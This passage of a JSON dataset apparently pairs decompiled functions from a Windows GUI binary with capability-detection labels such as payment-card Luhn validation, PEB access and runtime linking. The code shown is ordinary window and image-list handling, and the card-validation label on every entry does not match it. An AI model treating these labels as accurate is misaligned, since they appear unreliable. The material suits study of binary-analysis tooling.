            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004459d0(int32_t *arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t lpRect;\n    int32_t var_14h;\n    uint lpPoint;\n    uint var_4h;\n    \n    sub.user32.dll_ClientToScreen();\n    sub.user32.dll_GetWindowRect();\n    *arg_8h = in_EDX - lpRect;\n    arg_8h[1] = in_ECX - var_14h;\n    return;\n}\n",
        "token_count": 120
    },
    "00445a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00445a10(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint dxHotspot;\n    uint dyHotspot;\n    uint himlDrag;\n    \n    if (*(in_EAX + 0x68) != -1) {\n        uStack24 = 1;\n        uStack28 = 1;\n        uStack32 = 1;\n        uStack36 = 0xe;\n        uStack40 = 0x445a35;\n        uStack40 = (***0x484484)();\n        uStack44 = 0xd;\n        uStack48 = 0x445a41;\n        uStack48 = (***0x484484)();\n        puStack52 = 0x445a47;\n        himlDrag = sub.comctl32.dll_ImageList_Create();\n        uStack56 = 0x445ad0;\n        uStack60 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc4;\n        puStack52 = &stack0xfffffffc;\n        fcn.0045b200();\n        fcn.0042da60();\n        fcn.0045b200();\n        fcn.0042da60();\n        sub.comctl32.dll_ImageList_SetDragCursorImage(himlDrag, 0, 0, 0);\n        sub.comctl32.dll_ImageList_GetDragImage(0, &fcn.00445a10::dxHotspot);\n        uVar1 = himlDrag;\n        sub.comctl32.dll_ImageList_SetDragCursorImage(himlDrag, 1, dxHotspot, dyHotspot);\n        *in_FS_OFFSET = uVar1;\n        sub.comctl32.dll_ImageList_Destroy(himlDrag, 0x445ad7);\n        return;\n    }\n    return;\n}\n",
        "token_count": 457
    },
    "00445e7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445e7c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x1c) = param_1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "00447230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447230(int32_t arg_8h)\n\n{\n    int32_t arg_ch;\n    int32_t in_EDX;\n    uint *arg_8h_00;\n    uint uVar1;\n    uint uVar2;\n    uint var_10h;\n    \n    uVar2 = 0;\n    uVar1 = 1;\n    arg_ch = *(*(arg_8h + -8) + 0x18) + in_EDX + -2;\n    arg_8h_00 = &var_10h;\n    fcn.0041b080(arg_8h_00, arg_ch);\n    uVar1 = fcn.0042704c(&var_10h, arg_8h_00, arg_ch, uVar1, uVar2);\n    sub.user32.dll_DrawFrameControl(uVar1);\n    return;\n}\n",
        "token_count": 192
    },
    "00447b9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447b9c(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x447c4b;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    (**(**(arg_8h + -4) + 0x10))();\n    (**(**(arg_8h + -4) + 0x10))();\n    (**(**(arg_8h + -4) + 0x10))();\n    arg_8h_00 = arg_8h;\n    fcn.00446180();\n    fcn.00447b24(arg_8h_00);\n    if (*(in_EAX + 8) != 0) {\n        fcn.00447b9c(arg_8h);\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.00447b9c(arg_8h);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x447c52;\n    uStack28 = 0x447c4a;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 332
    },
    "00447e9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447e9c(uint *param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    uVar1 = *param_1;\n    uVar2 = param_1[1];\n    *(in_EAX + 0x60) = param_2;\n    fcn.0044407c(uVar1, uVar2);\n    fcn.004489fc();\n    uVar1 = fcn.0044407c();\n    *(in_EAX + 0x5c) = uVar1;\n    uVar3 = 0;\n    uVar2 = sub.user32.dll_GetDCEx(uVar1, 0, 0x412);\n    *(in_EAX + 0x58) = uVar2;\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x54) = uVar3;\n    fcn.00447fb0();\n    return;\n}\n",
        "token_count": 235
    },
    "0044812c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044812c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        var_8h = fcn.004463f0();\n        iVar1 = fcn.00445f54();\n        var_8h = var_8h + iVar1;\n    }\n    else {\n        var_8h = fcn.004463f0();\n    }\n    fcn.0044809c(&stack0xfffffffc);\n    return var_8h;\n}\n",
        "token_count": 149
    },
    "0044817c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044817c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar2 = 4;\n    if (param_2 != 0) {\n        fcn.0043d1e8();\n        fcn.0043d1e8();\n        if (((var_1ch < var_ch) || (var_14h <= var_4h)) || (var_8h < var_18h)) {\n            if (((var_20h < var_10h) || (var_18h <= var_8h)) || (var_4h < var_14h)) {\n                iVar1 = var_1ch + var_14h >> 1;\n                if (iVar1 < 0) {\n                    iVar1 = iVar1 + ((var_1ch + var_14h & 1U) != 0);\n                }\n                if (iVar1 <= var_ch) {\n                    uVar2 = 2;\n                }\n            }\n            else {\n                uVar2 = 3;\n            }\n        }\n        else {\n            uVar2 = 1;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 337
    },
    "004483b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004483b0(char param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00446740();\n    if (iVar1 == 0) {\n        if (param_1 != '\\0') {\n            fcn.0041b058();\n            iVar1 = fcn.00446f34();\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = *(iVar1 + 4);\n            }\n            fcn.0044817c(uVar2);\n            (**(*in_EAX + 8))();\n        }\n    }\n    else {\n        if (param_1 == '\\0') {\n            fcn.004481f8(&stack0xfffffffc);\n        }\n        else {\n            fcn.00448278(&stack0xfffffffc);\n        }\n        (**(*in_EAX[5] + 0x7c))();\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "00448e84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00448e84(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    uint *puVar3;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_10h = 0;\n    var_4h = 0;\n    uStack48 = 0x448ffc;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack52;\n    puVar3 = &var_4h;\n    var_ch = sub.kernel32.dll_GetCurrentProcessId();\n    var_8h._0_1_ = 0;\n    fcn.00409998(puVar3);\n    fcn.0040461c();\n    uVar1 = fcn.00404a88();\n    *0x485ab4 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    puVar3 = &var_10h;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    fcn.00409998(puVar3);\n    fcn.0040461c();\n    uVar1 = fcn.00404a88();\n    *0x485ab6 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    uVar1 = fcn.00404a88();\n    *0x485ac0 = sub.user32.dll_RegisterWindowMessageA(uVar1);\n    *0x485af8 = fcn.0041c758();\n    fcn.00448a88();\n    *0x485aa8 = fcn.004488b0();\n    uVar1 = fcn.0045aac0();\n    **0x484828 = uVar1;\n    uVar1 = fcn.0045bbd4();\n    **0x48466c = uVar1;\n    fcn.0045d934();\n    fcn.0041be7c();\n    iVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x449038);\n    if (iVar2 != 0) {\n        *0x483bc0 = sub.kernel32.dll_GetProcAddress_1(iVar2, 0x449040);\n        in_stack_ffffffac = iVar2;\n    }\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.004045c8(0x449003);\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 616
    },
    "00449914": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00449914(code *arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(*(in_EAX + 0x30) + 8);\n    if (-1 < iVar1 + -1) {\n        iVar2 = 0;\n        do {\n            if (*(*(*(*(in_EAX + 0x30) + 4) + iVar2 * 4) + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "00449c98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00449c98(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.00423054();\n    *(in_EAX + 0x6a) = 1;\n    *(in_EAX + 0x80) = 0xffffffff;\n    *(in_EAX + 0x86) = 1;\n    *(in_EAX + 0x90) = 0;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 196
    },
    "0044a6f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.0044a6f4(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint var_18h;\n    uint hdc;\n    int32_t var_4h;\n    \n    uStack36 = 0;\n    puStack40 = 0x44a705;\n    var_4h = in_EAX;\n    hdc = sub.user32.dll_GetDC();\n    uStack44 = 0x44a795;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    piVar1 = *(var_4h + 0x50);\n    puStack40 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap(hdc, *(var_4h + 0x34), *(var_4h + 0x30));\n    fcn.0042c498();\n    fcn.0042b978();\n    fcn.00426904();\n    arg_ch = (**(*piVar1 + 0x20))();\n    arg_8h = &fcn.0044a6f4::var_18h;\n    (**(*piVar1 + 0x2c))();\n    fcn.0041b080(arg_8h, arg_ch);\n    fcn.0042b978(&fcn.0044a6f4::var_18h);\n    fcn.00426ca8();\n    *in_FS_OFFSET = arg_8h;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x44a79c);\n    return;\n}\n",
        "token_count": 396
    },
    "0044a7b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a7b8(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = *(in_EAX + 0x34);\n    uStack12 = *(in_EAX + 0x30);\n    puVar1 = &uStack8;\n    sub.comctl32.dll_ImageList_GetIconSize(param_2, puVar1, &uStack12);\n    *(in_EAX + 0x34) = puVar1;\n    *(in_EAX + 0x30) = param_2;\n    fcn.0044a6f4();\n    return;\n}\n",
        "token_count": 163
    },
    "0044a958": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044a958(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x44a973;\n    fcn.0042b3a8();\n    uStack36 = 0x44aa07;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x44a990;\n    puStack32 = &stack0xfffffffc;\n    fcn.0042b3a8();\n    uStack48 = 0x44a9ea;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.0044a6e8();\n    uVar1 = fcn.0044a82c();\n    uVar2 = fcn.0044a82c(uVar1);\n    uVar1 = *(in_EAX + 0x3c);\n    sub.comctl32.dll_ImageList_Add(uVar1, uVar2);\n    *in_FS_OFFSET = uVar1;\n    fcn.00403820(0x44a9f1);\n    return;\n}\n",
        "token_count": 347
    },
    "0044b248": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0044b248(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    piVar2 = in_EAX;\n    if (param_2 != NULL) {\n        puStack32 = 0x44b260;\n        piVar1 = fcn.0044aa24();\n        puStack32 = 0x44b269;\n        piVar2 = fcn.0044aa24();\n        if (piVar1 == piVar2) {\n            puStack32 = 0x44b27d;\n            iVar3 = fcn.0044aa24();\n            if (iVar3 != 0) {\ncode_r0x0044b295:\n                puStack32 = 0x44b2a1;\n                fcn.004037f0();\n                uStack36 = 0x44b324;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x44b2bc;\n                puStack32 = &fcn.0044b248::var_1h + 1;\n                (**(*in_EAX + 0x3c))();\n                puStack44 = 0x44b2c8;\n                fcn.004037f0();\n                uStack48 = 0x44b307;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.0044b248::var_1h + 1;\n                (**(*param_2 + 0x3c))();\n                var_1h._0_1_ = fcn.0044b204();\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x44b30e;\n                uStack48 = 0x44b306;\n                uVar4 = fcn.00403820();\n                return uVar4;\n            }\n            puStack32 = 0x44b288;\n            piVar2 = fcn.0044aa24();\n            if (piVar2 != NULL) goto code_r0x0044b295;\n            var_1h._0_1_ = 1;\n            goto code_r0x0044b32b;\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x0044b32b:\n    return piVar2 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 672
    },
    "0044b394": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044b394(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00422ab4();\n    uVar2 = *(*in_EAX + 0x38);\n    uVar1 = *(*in_EAX + 0x3c);\n    piVar3 = in_EAX;\n    fcn.0044b338(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1, in_EAX, uVar2, piVar3);\n    return;\n}\n",
        "token_count": 163
    },
    "0044b680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044b680(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY48;\n    uint uStackY44;\n    uchar *puStackY40;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY40 = 0x44b69f;\n    iVar1 = fcn.00423244(0);\n    uStackY44 = 0x44b6e0;\n    iStackY48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (iVar1 != 0) {\n        iVar1 = iVar1 + 0x14;\n    }\n    puStackY40 = &stack0xfffffffc;\n    sub.comctl32.dll_ImageList_Read();\n    fcn.0044a7f0();\n    *in_FS_OFFSET = iVar1;\n    uStackY44 = 0x44b6e7;\n    iStackY48 = 0x44b6df;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 245
    },
    "0044d738": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044d738(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x70) != 0) && (cVar1 = fcn.004039b8(),  cVar1 != '\\0')) {\n        fcn.00450014();\n        fcn.00450510();\n    }\n    if (*(in_EAX + 0x70) != 0) {\n        fcn.0045107c();\n    }\n    fcn.0044ced4();\n    return;\n}\n",
        "token_count": 133
    },
    "0044f05c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044f05c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_154h;\n    uint var_bch;\n    uint var_b8h;\n    \n    var_154h = 0x154;\n    iVar1 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_154h, 0);\n    if (iVar1 != 0) {\n        **(arg_8h + -4) = var_bch;\n        **(arg_8h + 8) = var_b8h;\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "0044fe30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044fe30(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    (**(**(arg_8h + -8) + 8))();\n    uVar1 = (**(**(arg_8h + -0xc) + 0x14))();\n    *(arg_8h + -0x10) = uVar1;\n    iVar2 = (**(**(arg_8h + -0x14) + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            uVar1 = (**(**(arg_8h + -0x14) + 0x18))();\n            (**(**(arg_8h + -0x14) + 0x18))(uVar1);\n            (**(**(arg_8h + -8) + 0x3c))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00404660();\n    return;\n}\n",
        "token_count": 234
    },
    "004508a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.004508a8(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.0044ced4();\n    return 0;\n}\n",
        "token_count": 63
    },
    "0045159c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045159c(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    \n    if (-1 < *(arg_8h + -4)) {\n        iVar3 = *(arg_8h + -4) + 1;\n        puVar2 = *(arg_8h + -8);\n        do {\n            if (*(in_EAX + 0x3f) == *puVar2) {\n                piVar1 = *(arg_8h + 0xc) + *(in_EAX + 0x3f) * 4;\n                *piVar1 = *piVar1 + 1;\n                fcn.0044d498();\n            }\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 219
    },
    "004515e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004515e8(int32_t arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0045107c();\n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        do {\n            *arg_ch = 0;\n            arg_ch = arg_ch + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    fcn.0044ced4();\n    return;\n}\n",
        "token_count": 147
    },
    "0045400c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045400c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    if (in_EAX != 0) {\n        uVar1 = sub.user32.dll_GetWindowLongA();\n        if (param_2 == '\\0') {\n            if ((uVar1 & 0x200) == 0) {\n                return;\n            }\n        }\n        else if ((uVar1 & 0x200) != 0) {\n            return;\n        }\n        sub.user32.dll_SetWindowLongA();\n        sub.user32.dll_SetWindowPos();\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "004540e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004540e0(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x483e24;\n    puStack32 = &stack0xfffffffc;\n    puStack44 = &stack0xfffffffc;\n    *0x483e24 = 0;\n    uStack36 = 0x454183;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    uStack48 = 0x45414c;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    uVar2 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.00454090, 0);\n    sub.user32.dll_EnumThreadWindows();\n    *in_FS_OFFSET = uVar2;\n    *in_FS_OFFSET = uStack52;\n    *0x483e24 = uVar1;\n    return;\n}\n",
        "token_count": 269
    },
    "004542c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.004542c4(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint uStack8;\n    uchar uStack4;\n    \n    uStack8 = sub.user32.dll_GetActiveWindow();\n    uStack4 = 0;\n    pcVar3 = fcn.004542a4;\n    uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.004542a4, &uStack8);\n    uVar2 = sub.user32.dll_EnumThreadWindows(uVar1);\n    return CONCAT44(pcVar3, uVar2 & 0xffffff00 | pcVar3 & 0xff);\n}\n",
        "token_count": 150
    },
    "004544e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004544e4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x454555;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    iVar1 = fcn.004544bc();\n    if (iVar1 == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.0040675c();\n        fcn.0040c918(in_stack_ffffffd4, arg_ch);\n        fcn.00403fc0();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x45455c;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 288
    },
    "00454564": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00454564(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00403b58();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.004037f0();\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 0x18) = arg_8h;\n    *(in_EAX + 10) = 0x50;\n    *(in_EAX + 8) = 8;\n    *(in_EAX + 0x1c) = 1;\n    *(in_EAX + 0x20) = 10;\n    *(in_EAX + 0x40) = 4;\n    *(in_EAX + 0x3c) = 0xc;\n    *(in_EAX + 0x28) = 0xff000014;\n    *(in_EAX + 0x2c) = 1;\n    *(in_EAX + 0x44) = 1;\n    if (in_DL != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 326
    },
    "004550f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004550f0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0043fd64();\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x455164;\n    uVar1 = fcn.00454564(0);\n    *(in_EAX + 0x208) = uVar1;\n    uVar2 = 1;\n    uVar1 = fcn.00454564(1);\n    *(in_EAX + 0x20c) = uVar1;\n    *(in_EAX + 0x210) = 1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 254
    },
    "004554dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
